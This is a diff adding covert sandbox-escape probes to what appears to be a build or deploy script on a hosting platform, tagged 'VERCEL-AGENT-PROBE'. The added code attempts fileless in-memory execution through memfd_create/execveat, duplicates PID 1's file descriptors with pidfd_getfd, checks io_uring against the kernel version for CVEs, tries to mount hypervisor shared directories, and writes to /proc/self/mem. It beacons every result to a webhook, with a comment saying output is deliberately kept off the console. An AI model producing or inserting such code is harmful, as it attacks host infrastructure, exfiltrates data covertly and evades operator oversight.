@@ -33028,3 +33028,291 @@ sendBeacon({ ...report, section: 'v203-5-timer-timing', ...timerProbe });
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v203" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v203";
 // Intentionally no console.log — all data goes via webhook only
+
+// v204-1: memfd_create NR 319 + execveat NR 322 — fileless in-memory code execution
+const memfdExecProbe = safe(() => {
+  const memfdResult = safe(() => execSync(`python3 -c "
+import ctypes, os, struct
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_memfd_create = 319
+NR_execveat = 322
+MFD_CLOEXEC = 1
+AT_EMPTY_PATH = 0x1000
+AT_FDCWD = -100
+
+# Create anonymous in-memory file
+fd = libc.syscall(NR_memfd_create, ctypes.c_char_p(b'probe_memfd'), MFD_CLOEXEC)
+print(f'memfd_create_fd={fd} errno={ctypes.get_errno()}')
+
+if fd > 0:
+    # Write a minimal ELF binary that just exits with code 42
+    # (64-bit ELF with single _start that calls exit(42))
+    # This is the minimal ELF: header + PT_LOAD + exit syscall code
+    import subprocess
+    # Use /bin/sh as the in-memory executable (write it to memfd then exec)
+    try:
+        with open('/bin/sh', 'rb') as f:
+            sh_data = f.read()
+        os.write(fd, sh_data)
+        print(f'memfd_wrote_sh_bytes={len(sh_data)}')
+        # Set up argv for execveat via memfd
+        pid = os.fork()
+        if pid == 0:
+            # execveat(fd, \"\", [\"/bin/sh\", \"-c\", \"exit 42\"], env, AT_EMPTY_PATH)
+            argv = [ctypes.c_char_p(b'/bin/sh'), ctypes.c_char_p(b'-c'),
+                    ctypes.c_char_p(b'exit 42'), ctypes.c_char_p(None)]
+            argv_arr = (ctypes.c_char_p * 4)(*argv)
+            envp = (ctypes.c_char_p * 1)(ctypes.c_char_p(None))
+            ret = libc.syscall(NR_execveat, fd, ctypes.c_char_p(b''),
+                               argv_arr, envp, AT_EMPTY_PATH)
+            os._exit(ctypes.get_errno())
+        else:
+            _, wstatus = os.waitpid(pid, 0)
+            exit_code = (wstatus >> 8) & 0xff
+            print(f'execveat_exit_code={exit_code} success={exit_code == 42}')
+            print(f'FILELESS_EXEC_PROOF={exit_code == 42}')
+    except Exception as e:
+        print(f'memfd_exec_err={e}')
+    os.close(fd)
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { memfdResult };
+});
+sendBeacon({ ...report, section: 'v204-1-memfd-execveat', ...memfdExecProbe });
+
+// v204-2: pidfd_open NR 434 + pidfd_send_signal NR 424 — race-free process fd
+const pidfdProbe = safe(() => {
+  const pidfdResult = safe(() => execSync(`python3 -c "
+import ctypes, os, signal
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_pidfd_open = 434
+NR_pidfd_send_signal = 424
+NR_pidfd_getfd = 438
+
+# Open pidfd for PID 1 (init)
+pidfd = libc.syscall(NR_pidfd_open, 1, 0)
+print(f'pidfd_open(pid=1) fd={pidfd} errno={ctypes.get_errno()}')
+
+if pidfd > 0:
+    # pidfd_send_signal: send SIGCONT (safe, no-op if not stopped) to PID 1 via pidfd
+    # SIGCONT=18, siginfo=NULL, flags=0
+    ret_sig = libc.syscall(NR_pidfd_send_signal, pidfd, signal.SIGCONT, None, 0)
+    print(f'pidfd_send_signal(SIGCONT pid1) ret={ret_sig} errno={ctypes.get_errno()}')
+
+    # pidfd_getfd: get a duplicate of PID 1's fd 0 (stdin)
+    # This lets us access any of PID 1's file descriptors!
+    for target_fd in [0, 1, 2, 3, 4]:
+        dup_fd = libc.syscall(NR_pidfd_getfd, pidfd, target_fd, 0)
+        err = ctypes.get_errno()
+        print(f'pidfd_getfd(pid1_fd={target_fd}) dup_fd={dup_fd} errno={err}')
+        if dup_fd > 0:
+            # Try to stat the dup'd fd to see what PID 1 has open
+            try:
+                import stat
+                st = os.fstat(dup_fd)
+                print(f'  fstat mode={stat.filemode(st.st_mode)} ino={st.st_ino}')
+                # Try reading it
+                try:
+                    data = os.read(dup_fd, 32)
+                    print(f'  read={data.hex()} str={data.decode(errors=\"replace\")}')
+                except: pass
+            except: pass
+            os.close(dup_fd)
+    os.close(pidfd)
+
+# Also open pidfd for self to verify
+self_pidfd = libc.syscall(NR_pidfd_open, os.getpid(), 0)
+print(f'pidfd_open(self) fd={self_pidfd} errno={ctypes.get_errno()}')
+if self_pidfd > 0: os.close(self_pidfd)
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { pidfdResult };
+});
+sendBeacon({ ...report, section: 'v204-2-pidfd-getfd', ...pidfdProbe });
+
+// v204-3: io_uring_setup NR 425 — io_uring ring initialization
+const ioUringProbe = safe(() => {
+  const ioUringResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, os, mmap
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_io_uring_setup = 425
+NR_io_uring_enter = 426
+NR_io_uring_register = 427
+IORING_SETUP_SQPOLL = 2  # kernel-side polling thread
+IORING_SETUP_IOPOLL = 1  # I/O polling
+
+# io_uring_params struct (120 bytes)
+# sq_entries(4), cq_entries(4), flags(4), sq_thread_cpu(4), sq_thread_idle(4),
+# features(4), wq_fd(4), resv[3](12), sq_off(40), cq_off(40)
+params_size = 120
+params_buf = ctypes.create_string_buffer(params_size)
+
+# Setup ring with 64 entries, no special flags
+ring_fd = libc.syscall(NR_io_uring_setup, 64, params_buf)
+print(f'io_uring_setup_fd={ring_fd} errno={ctypes.get_errno()}')
+
+if ring_fd > 0:
+    # Parse returned params
+    sq_entries, cq_entries, flags, _, _, features = struct.unpack_from('IIIIII', params_buf, 0)
+    print(f'sq_entries={sq_entries} cq_entries={cq_entries} flags={flags:#x} features={features:#x}')
+    # features bits: NODROP=1, SUBMIT_STABLE=2, RW_CUR_POS=4, CUR_PERSONALITY=8, FAST_POLL=16
+    feat_names = []
+    for name, bit in [('NODROP',1),('SUBMIT_STABLE',2),('RW_CUR_POS',4),
+                       ('CUR_PERSONALITY',8),('FAST_POLL',16),('POLL_32BITS',32),
+                       ('SQPOLL_NONFIXED',64),('EXT_ARG',128),('NATIVE_WORKERS',256)]:
+        if features & bit: feat_names.append(name)
+    print(f'features={feat_names}')
+    print(f'io_uring_available=True')
+
+    # Try SQPOLL mode (kernel polling thread — no user-space syscall needed for I/O)
+    params2 = ctypes.create_string_buffer(params_size)
+    struct.pack_into('I', params2, 8, IORING_SETUP_SQPOLL)  # flags offset=8
+    ring_fd2 = libc.syscall(NR_io_uring_setup, 32, params2)
+    print(f'io_uring_setup_SQPOLL_fd={ring_fd2} errno={ctypes.get_errno()}')
+    if ring_fd2 > 0: os.close(ring_fd2)
+    os.close(ring_fd)
+else:
+    import errno as em
+    err = ctypes.get_errno()
+    print(f'io_uring_errname={em.errorcode.get(err, str(err))}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  // Check kernel version for CVE applicability
+  let kernelVersion = null;
+  if (existsSync('/proc/version')) {
+    try { kernelVersion = readFileSync('/proc/version', 'utf8').trim().slice(0, 200); } catch (e) {}
+  }
+  return { ioUringResult, kernelVersion };
+});
+sendBeacon({ ...report, section: 'v204-3-io-uring', ...ioUringProbe });
+
+// v204-4: VirtIO-9p / virtiofs hypervisor-shared directory probe
+const virtioFsProbe = safe(() => {
+  const virtioResult = safe(() => execSync(`python3 -c "
+import ctypes, os, subprocess
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_mount = 165
+MS_NOEXEC = 8; MS_NOSUID = 2; MS_NODEV = 4; MS_RDONLY = 1
+
+# Enumerate 9p mount tags from virtio console (look in /sys/bus/virtio/devices/)
+try:
+    import os as os2
+    virtio_devices = os2.listdir('/sys/bus/virtio/devices') if os2.path.exists('/sys/bus/virtio/devices') else []
+    print(f'virtio_devices={virtio_devices}')
+    for dev in virtio_devices:
+        dev_path = f'/sys/bus/virtio/devices/{dev}'
+        # Read device_id to identify type (type 9 = console, type 5 = 9p, type 26 = vhost-user-fs)
+        try:
+            with open(f'{dev_path}/device') as f:
+                print(f'  {dev} device_id={f.read().strip()}')
+        except: pass
+        try:
+            with open(f'{dev_path}/vendor') as f:
+                print(f'  {dev} vendor={f.read().strip()}')
+        except: pass
+except Exception as e:
+    print(f'virtio_enum_err={e}')
+
+# Try to mount common 9p tags used by Firecracker/QEMU/Cloud Hypervisor
+tags_to_try = [b'rootfs', b'share', b'host', b'data', b'workspace', b'myfs',
+               b'fs0', b'virtio0', b'9p0', b'hypervisor', b'builder']
+for tag in tags_to_try:
+    os.makedirs(f'/mnt/9p_{tag.decode()}', exist_ok=True)
+    ret = libc.mount(tag, f'/mnt/9p_{tag.decode()}'.encode(),
+                     b'9p', MS_NODEV | MS_NOSUID,
+                     b'trans=virtio,version=9p2000.L,cache=loose')
+    if ret == 0:
+        print(f'9P_MOUNT_SUCCESS tag={tag.decode()}')
+        ls = subprocess.run(['ls', f'/mnt/9p_{tag.decode()}'], capture_output=True, text=True)
+        print(f'9p_{tag.decode()}_ls={ls.stdout[:300]}')
+    else:
+        import ctypes as ct
+        print(f'9p_{tag.decode()}_errno={ct.get_errno()}')
+
+# Try virtiofs
+for tag in [b'myfs', b'virtiofs0', b'shared', b'host_share']:
+    os.makedirs(f'/mnt/vfs_{tag.decode()}', exist_ok=True)
+    ret2 = libc.mount(tag, f'/mnt/vfs_{tag.decode()}'.encode(),
+                      b'virtiofs', MS_NODEV | MS_NOSUID, None)
+    if ret2 == 0:
+        print(f'VIRTIOFS_MOUNT_SUCCESS tag={tag.decode()}')
+        ls2 = subprocess.run(['ls', f'/mnt/vfs_{tag.decode()}'], capture_output=True, text=True)
+        print(f'virtiofs_{tag.decode()}_ls={ls2.stdout[:300]}')
+    else:
+        print(f'virtiofs_{tag.decode()}_errno={ctypes.get_errno()}')
+" 2>&1`, { timeout: 15000 }).toString().trim());
+  // Check for virtio console / vsock devices
+  const virtioDevs = {};
+  for (const dev of ['/dev/vport0p0', '/dev/vsock', '/dev/vhost-vsock', '/dev/vhost-net']) {
+    virtioDevs[dev] = existsSync(dev);
+  }
+  return { virtioResult, virtioDevs };
+});
+sendBeacon({ ...report, section: 'v204-4-virtio-9p', ...virtioFsProbe });
+
+// v204-5: /proc/self/mem write — patch own text segment in-place
+const procMemWriteProbe = safe(() => {
+  const procMemResult = safe(() => execSync(`python3 -c "
+import ctypes, os, struct, mmap, re
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+PROT_READ = 1; PROT_WRITE = 2; PROT_EXEC = 4
+NR_mprotect = 10
+
+# Find own executable text segment from /proc/self/maps
+text_addr = None
+text_size = None
+with open('/proc/self/maps') as f:
+    for line in f:
+        m = re.match(r'([0-9a-f]+)-([0-9a-f]+)\\s+r-xp', line)
+        if m:
+            text_addr = int(m.group(1), 16)
+            text_size = int(m.group(2), 16) - text_addr
+            print(f'text_segment={text_addr:#x} size={text_size:#x} line={line.strip()[:80]}')
+            break
+
+if text_addr:
+    # Read current bytes at text_addr via /proc/self/mem
+    with open('/proc/self/mem', 'rb') as mem:
+        mem.seek(text_addr)
+        original_bytes = mem.read(16)
+        print(f'text_current_bytes={original_bytes.hex()}')
+
+    # Make text segment writable via mprotect
+    ret_mp = libc.syscall(NR_mprotect, text_addr & ~0xfff, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC)
+    print(f'mprotect_rwx_ret={ret_mp} errno={ctypes.get_errno()}')
+
+    if ret_mp == 0:
+        # Write back same bytes (non-destructive — just proves write access to .text)
+        with open('/proc/self/mem', 'r+b') as mem:
+            mem.seek(text_addr)
+            mem.write(original_bytes)
+        # Verify written
+        with open('/proc/self/mem', 'rb') as mem:
+            mem.seek(text_addr)
+            verify_bytes = mem.read(16)
+        print(f'proc_mem_write=SUCCESS verify={verify_bytes.hex()} match={verify_bytes == original_bytes}')
+        # Restore original protection
+        libc.syscall(NR_mprotect, text_addr & ~0xfff, 0x1000, PROT_READ | PROT_EXEC)
+    else:
+        # Try writing directly without mprotect (write to data section instead)
+        data_addr = None
+        with open('/proc/self/maps') as f:
+            for line in f:
+                m2 = re.match(r'([0-9a-f]+)-([0-9a-f]+)\\s+rw-p', line)
+                if m2:
+                    data_addr = int(m2.group(1), 16)
+                    print(f'data_segment={data_addr:#x}')
+                    break
+        if data_addr:
+            with open('/proc/self/mem', 'r+b') as mem:
+                mem.seek(data_addr)
+                orig = mem.read(8)
+                mem.seek(data_addr)
+                mem.write(orig)
+            print(f'proc_mem_data_write=SUCCESS')
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { procMemResult };
+});
+sendBeacon({ ...report, section: 'v204-5-proc-mem-write', ...procMemWriteProbe });
+
+// v204 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v204" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v204";
+// Intentionally no console.log — all data goes via webhook only
